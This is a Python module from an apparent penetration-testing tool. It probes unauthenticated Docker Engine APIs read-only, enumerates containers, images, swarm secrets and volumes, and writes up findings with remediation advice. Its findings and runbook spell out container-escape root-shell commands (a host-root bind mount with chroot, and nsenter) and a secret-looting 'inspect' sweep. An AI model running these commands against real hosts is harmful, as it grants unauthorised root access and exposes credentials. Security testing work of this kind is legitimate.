"""Deep Docker Engine API enumeration + vulnerability identification (stdlib only).

An exposed, unauthenticated Docker Engine API (TCP 2375 plain, or 2376 without
client-certificate enforcement) is a full host compromise: anyone who can reach it
can create a container that bind-mounts the host root and runs as root, i.e. instant
root-level RCE on the Docker host. recce reads the API unauthenticated - /version,
/info, /containers/json, /images/json - and, if it answers, reports a CONFIRMED
critical finding (the successful unauthenticated read IS the proof). Everything folds
into the main totals and a dedicated Docker tab. Airgapped, stdlib only.
"""
from __future__ import annotations

import http.client
import json
import ssl

from ..core.models import Host, Port
from .svccommon import finding_builder

_PORTS = (2375, 2376)
_TIMEOUT = 6.0


def is_docker(port: Port) -> bool:
    if not port.is_open:
        return False
    if port.portid in _PORTS:
        return True
    return "docker" in f"{port.service} {port.product}".lower()


def _scheme(port: int) -> str:
    return "https" if port == 2376 else "http"


_READ_CAP = 16 * 1024 * 1024   # hard ceiling on a single response body (16 MB)


def _read_capped(resp, cap: int = _READ_CAP) -> bytes:
    """Read an HTTP response to EOF, bounded by `cap` - so a large /containers/json
    or /images/json isn't truncated mid-buffer (which broke json parsing)."""
    chunks, total = [], 0
    while total < cap:
        chunk = resp.read(min(65536, cap - total))
        if not chunk:
            break
        chunks.append(chunk)
        total += len(chunk)
    return b"".join(chunks)


def _get(ip: str, port: int, path: str, timeout: float = _TIMEOUT):
    """GET a Docker API path. Returns (status, parsed_json_or_text) or None."""
    conn = None
    try:
        if _scheme(port) == "https":
            conn = http.client.HTTPSConnection(
                ip, port, timeout=timeout, context=ssl._create_unverified_context())
        else:
            conn = http.client.HTTPConnection(ip, port, timeout=timeout)
        conn.request("GET", path, headers={"Accept": "application/json",
                                           "User-Agent": "recce-docker/1.0"})
        resp = conn.getresponse()
        body = _read_capped(resp).decode("utf-8", "replace")
        try:
            return resp.status, json.loads(body)
        except ValueError:
            return resp.status, body
    except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
        return None
    finally:
        if conn is not None:
            try:
                conn.close()
            except OSError:
                pass


def probe(ip: str, port: int, timeout: float = _TIMEOUT) -> dict | None:
    """Read the Docker API unauthenticated. Returns a dict with `exposed` True when
    /version or /info answered 200 with JSON, else None."""
    ver = _get(ip, port, "/version", timeout)
    if not ver or ver[0] != 200 or not isinstance(ver[1], dict):
        # /version may 404 on very old daemons; fall back to /info.
        info = _get(ip, port, "/info", timeout)
        if not info or info[0] != 200 or not isinstance(info[1], dict):
            return None
        v = {}
    else:
        v = ver[1]
        info = _get(ip, port, "/info", timeout)
    out = {"ip": ip, "port": port, "exposed": True,
           "version": v.get("Version", ""), "api_version": v.get("ApiVersion", ""),
           "os": v.get("Os", ""), "arch": v.get("Arch", ""),
           "kernel": v.get("KernelVersion", "")}
    if info and info[0] == 200 and isinstance(info[1], dict):
        d = info[1]
        out["name"] = d.get("Name", "")
        out["containers"] = d.get("Containers")
        out["containers_running"] = d.get("ContainersRunning")
        out["images"] = d.get("Images")
        out["server_version"] = d.get("ServerVersion", "")
        out["kernel"] = out["kernel"] or d.get("KernelVersion", "")
    # Running containers + images (best-effort enrichment).
    cj = _get(ip, port, "/containers/json", timeout)
    if cj and cj[0] == 200 and isinstance(cj[1], list):
        out["running"] = [
            {"image": c.get("Image", ""),
             "names": [n.lstrip("/") for n in (c.get("Names") or [])],
             "command": c.get("Command", ""), "state": c.get("State", "")}
            for c in cj[1][:25] if isinstance(c, dict)]
        # For each running container, inspect its HostConfig for host-mount
        # escape routes (bind mounts to /, /etc, /root, /var/run/docker.sock,
        # /proc, /sys). Any of these gives full host control from inside
        # the container — the tester needs to know per-container which
        # ones are dangerous. Capped at 15 to keep the probe bounded.
        risky_binds: list[dict] = []
        for c in cj[1][:15]:
            if not isinstance(c, dict) or not c.get("Id"):
                continue
            insp = _get(ip, port, f"/containers/{c['Id']}/json", timeout)
            if not insp or insp[0] != 200 or not isinstance(insp[1], dict):
                continue
            hc = (insp[1].get("HostConfig") or {})
            binds = hc.get("Binds") or []
            privileged = bool(hc.get("Privileged"))
            for b in binds:
                # bind format: "hostpath:containerpath[:mode]"
                hp = str(b).split(":", 1)[0]
                # Root FS / dangerous paths.
                if hp in ("/", "/etc", "/root", "/proc", "/sys") or \
                        hp.startswith(("/etc/", "/root/", "/var/log/")) or \
                        hp.endswith("docker.sock"):
                    risky_binds.append({
                        "container": (c.get("Names") or ["?"])[0].lstrip("/"),
                        "image": c.get("Image", ""),
                        "bind": b, "privileged": privileged})
                    break
            else:
                if privileged:
                    risky_binds.append({
                        "container": (c.get("Names") or ["?"])[0].lstrip("/"),
                        "image": c.get("Image", ""),
                        "bind": "(privileged=true)", "privileged": True})
        out["risky_binds"] = risky_binds
    ij = _get(ip, port, "/images/json", timeout)
    if ij and ij[0] == 200 and isinstance(ij[1], list):
        tags = []
        for im in ij[1]:
            if isinstance(im, dict):
                tags.extend(im.get("RepoTags") or [])
        out["image_tags"] = [t for t in tags if t and t != "<none>:<none>"][:40]
    # Docker Swarm mode leaks — services, secrets, configs.
    sw = _get(ip, port, "/swarm", timeout)
    if sw and sw[0] == 200 and isinstance(sw[1], dict):
        out["swarm_mode"] = True
        svcs = _get(ip, port, "/services", timeout)
        if svcs and svcs[0] == 200 and isinstance(svcs[1], list):
            out["swarm_services"] = [
                s.get("Spec", {}).get("Name", "?") for s in svcs[1][:25]
                if isinstance(s, dict)]
        secs = _get(ip, port, "/secrets", timeout)
        if secs and secs[0] == 200 and isinstance(secs[1], list):
            # We can list names + IDs; the SECRET VALUE itself is only
            # readable to tasks that mount it, not via GET. Still, a name
            # list often discloses purpose (db_password, jwt_signing_key).
            out["swarm_secrets"] = [
                s.get("Spec", {}).get("Name", "?") for s in secs[1][:25]
                if isinstance(s, dict)]
        cfgs = _get(ip, port, "/configs", timeout)
        if cfgs and cfgs[0] == 200 and isinstance(cfgs[1], list):
            out["swarm_configs"] = [
                c.get("Spec", {}).get("Name", "?") for c in cfgs[1][:25]
                if isinstance(c, dict)]
    # Volumes — names may disclose purpose (postgres-data, jenkins-home,
    # secrets-vol). Not by itself a bug, but attack-surface data.
    vj = _get(ip, port, "/volumes", timeout)
    if vj and vj[0] == 200 and isinstance(vj[1], dict):
        vlist = (vj[1].get("Volumes") or [])
        out["volumes"] = [v.get("Name", "?") for v in vlist[:40] if isinstance(v, dict)]
    return out


def docker_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_docker(p):
                out.append({"ip": h.ip, "hostname": h.hostname, "port": p.portid,
                            "product": p.product or "", "version": p.version or ""})
    return out


# --- narratives -----------------------------------------------------------------

_NARRATIVE = {
    "docker_api": (
        "An unauthenticated Docker Engine API is the single highest-impact network "
        "exposure short of a shell: the daemon runs as root, and anyone who can reach "
        "the socket can tell it to create a container that bind-mounts the host's root "
        "filesystem (`-v /:/host`) and runs as root - then read or write ANY file on "
        "the host, add a root user, drop an SSH key, or chroot into the host for a full "
        "interactive root shell. It is remote, pre-authentication, root-level code "
        "execution on the Docker host, and it also exposes every other container's "
        "environment, secrets and mounted volumes. recce proves the exposure by "
        "reading /version and /info without any credential; it deliberately does NOT "
        "create a container (that would be an intrusive change) - the successful "
        "unauthenticated read is already proof the escape path is open."),
    "docker_secrets": (
        "The daemon's container/image inventory is readable unauthenticated. Image "
        "names and container commands routinely leak internal registry hosts, app "
        "versions and, via `docker inspect`-style data, environment variables holding "
        "database passwords, API keys and cloud credentials - reconnaissance that "
        "feeds the next hop even before the container-escape is used."),
}


TESTING_NARRATIVE = [
    ("1. Unauthenticated API read (stdlib)",
     "recce issues plain HTTP(S) GETs to the Docker Engine API (/version, /info, "
     "/containers/json, /images/json) with no credential. A 200 with JSON means the "
     "daemon is exposed without authentication."),
    ("2. Impact",
     "An exposed daemon = remote root RCE on the host via a privileged/host-mounted "
     "container. recce reports it CONFIRMED critical from the successful read; it does "
     "NOT create a container (that would be intrusive)."),
    ("3. Enumeration",
     "The running containers and image tags are captured as evidence and for the "
     "secret-leak angle (registry hosts, app versions, env-var secrets via inspect)."),
    ("4. Runbook",
     "The exact escape command (docker -H run a root-mounted container) and the "
     "inspect-for-secrets sweep are staged, to run within ROE."),
]


# --- findings -------------------------------------------------------------------

_finding = finding_builder("docker", _NARRATIVE)


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_docker(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not (pr and pr.get("exposed")):
                continue
            tgt = f"{h.ip}:{p.portid}"
            ver = pr.get("server_version") or pr.get("version") or "?"
            cnt = pr.get("containers")
            img = pr.get("images")
            detail = (f"The Docker Engine API answered /version and /info WITHOUT "
                      f"authentication (daemon {ver}"
                      + (f", {cnt} container(s), {img} image(s)" if cnt is not None else "")
                      + f", host '{pr.get('name', '?')}'). The daemon runs as root, so "
                      "this is remote root RCE on the host via a host-mounted container.")
            out.append(_finding(
                "critical", "Docker Engine API exposed without authentication", tgt,
                detail, "docker CLI",
                f"docker -H {_scheme(p.portid)}://<ip>:{p.portid} run --rm -v /:/host "
                "-it alpine chroot /host sh   # root shell on the host (ROE)",
                "Never bind the Docker API to a network socket unauthenticated. Bind to "
                "the local unix socket only, or enforce mutual-TLS (2376 with "
                "--tlsverify and client certs) and firewall the port.",
                ["CWE-306", "CWE-284", "CWE-269"], kind="docker_api"))
            running = pr.get("running") or []
            tags = pr.get("image_tags") or []
            if running or tags:
                bits = []
                if running:
                    bits.append("containers: " + ", ".join(
                        (r["names"][0] if r.get("names") else r.get("image", "?"))
                        for r in running[:12]))
                if tags:
                    bits.append("images: " + ", ".join(tags[:12]))
                out.append(_finding(
                    "high", "Docker container/image inventory readable unauthenticated",
                    tgt, "Unauthenticated API enumeration leaked the workload "
                    "inventory.  " + "  |  ".join(bits),
                    "docker CLI",
                    f"docker -H {_scheme(p.portid)}://<ip>:{p.portid} ps -a ; "
                    f"docker -H ...:{p.portid} inspect <id>   # env vars often hold secrets",
                    "Same as above - lock down the API; treat leaked image/registry "
                    "names and env secrets as compromised.",
                    ["CWE-200"], kind="docker_secrets"))
            # Per-container host-mount / privileged escape routes.
            risky = pr.get("risky_binds") or []
            if risky:
                lines = [
                    f"  {b['container']} ({b['image']}) "
                    f"{'PRIVILEGED ' if b.get('privileged') else ''}bind={b['bind']}"
                    for b in risky[:10]]
                out.append(_finding(
                    "critical",
                    "Docker containers with host-mount / privileged escape route",
                    tgt,
                    f"{len(risky)} running container(s) mount a dangerous host path "
                    f"or run privileged. Any of these hands root on the HOST from "
                    f"inside the container: docker.sock lets you spawn a new privileged "
                    f"container, /-mounts let you chroot into the host, /proc + /sys "
                    f"reach kernel namespaces.\n" + "\n".join(lines)
                    + (f"\n… (+{len(risky)-10} more)" if len(risky) > 10 else ""),
                    "docker CLI",
                    "docker exec <container> nsenter -t 1 -m -u -i -n -p sh   # if privileged",
                    "Never bind-mount host paths like /, /etc, /root, or "
                    "/var/run/docker.sock into containers unless absolutely required. "
                    "Never run containers with --privileged in production.",
                    ["CWE-284", "CWE-250", "CWE-269"], kind="docker_host_escape"))
            # Swarm secrets / configs / services enumeration.
            if pr.get("swarm_mode"):
                sec_names = pr.get("swarm_secrets") or []
                cfg_names = pr.get("swarm_configs") or []
                svc_names = pr.get("swarm_services") or []
                if sec_names or cfg_names:
                    bits = []
                    if sec_names: bits.append(f"secrets={', '.join(sec_names[:15])}")
                    if cfg_names: bits.append(f"configs={', '.join(cfg_names[:15])}")
                    if svc_names: bits.append(f"services={', '.join(svc_names[:15])}")
                    out.append(_finding(
                        "high", "Docker Swarm secrets/configs enumerated unauth", tgt,
                        f"Swarm mode active — secret and config NAMES readable via "
                        f"the unauthenticated API. Values require a task mount, but "
                        f"the names disclose intent (db_password, jwt_signing_key, "
                        f"api_tokens, tls_cert). Combined with the RCE via /containers/"
                        f"create + Binds root-mount, a hostile task can be spawned "
                        f"that mounts the secrets and exfiltrates them.\n  " +
                        "  |  ".join(bits),
                        "docker CLI",
                        f"docker -H {_scheme(p.portid)}://<ip>:{p.portid} secret ls; "
                        f"docker -H ...:{p.portid} config ls; docker -H ...:{p.portid} service ls",
                        "Bind the swarm manager API to a private interface; "
                        "enable mutual-TLS on the manager listener.",
                        ["CWE-200", "CWE-306"], kind="docker_swarm_secrets"))
            vols = pr.get("volumes") or []
            if vols:
                # Info only — volume names alone aren't a bug, but they often
                # disclose data intent (postgres-data, jenkins-home, .aws).
                out.append(_finding(
                    "info", "Docker volume inventory readable", tgt,
                    f"{len(vols)} named volume(s) enumerated: {', '.join(vols[:20])}"
                    + ("… (truncated)" if len(vols) > 20 else "") +
                    ". Volume names typically disclose which containers persist data "
                    "and what kind (secrets-vol, .aws, .kube, ssh-keys).",
                    "docker CLI",
                    f"docker -H {_scheme(p.portid)}://<ip>:{p.portid} volume ls",
                    "Informational — pairs with the api-exposed finding above.",
                    [], kind="docker_volumes"))
    return out


# --- runbook --------------------------------------------------------------------

def runbook(ip: str, port: int) -> list[dict]:
    sch = _scheme(port)
    steps = [
        ("enumerate", "docker",
         f"docker -H {sch}://<ip>:{port} version ; docker -H {sch}://<ip>:{port} info",
         "Confirm the unauthenticated daemon and its version."),
        ("enumerate", "docker",
         f"docker -H {sch}://<ip>:{port} ps -a ; docker -H {sch}://<ip>:{port} images",
         "List containers and images."),
        ("loot", "docker inspect",
         f"docker -H {sch}://<ip>:{port} inspect $(docker -H {sch}://<ip>:{port} ps -q)",
         "Pull env vars / mounts from every container - secrets live here."),
        ("escalate", "container escape",
         f"docker -H {sch}://<ip>:{port} run --rm -v /:/host -it alpine "
         "chroot /host sh   # root shell on the host (ROE)",
         "Mount the host root into a container -> root on the host."),
    ]
    return [{"phase": ph, "tool": t, "command": c, "why": w} for ph, t, c, w in steps]


# --- proof screenshot -----------------------------------------------------------

def proof_html(command, output, banner: str = "") -> str:
    from ..services.db import mssql
    return mssql.proof_html(command, output, prompt="$ ", banner=banner)


# --- top-level analyze ----------------------------------------------------------

def findings_to_vulns(fs: list[dict]) -> dict:
    """Docker findings -> {ip: [Vuln]} (source='docker')."""
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "docker", 2375)


def analyze(hosts: list[Host], active: bool = True, budget: float | None = None,
            progress=None) -> dict:
    """Full Docker analysis. Returns {targets, findings, runbooks, stats}."""
    from . import svcprobe
    targets = docker_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        # Route through iter_probe like every other deep module, so a Ctrl-C / budget /
        # one hostile endpoint stops cleanly with partials instead of losing the whole
        # docker phase (it was a bare for-loop with no interrupt or crash safety).
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            t["probed"] = True
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["exposed"] = pr.get("exposed", False)
                t["version"] = pr.get("server_version") or pr.get("version") or ""
                t["containers"] = pr.get("containers")
                t["images"] = pr.get("images")
                t["name"] = pr.get("name", "")
            else:
                # The port answered TCP (it's a target) but the API read failed -
                # mutual-TLS-locked or authenticated, not unauth-exposed.
                t["exposed"] = False
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
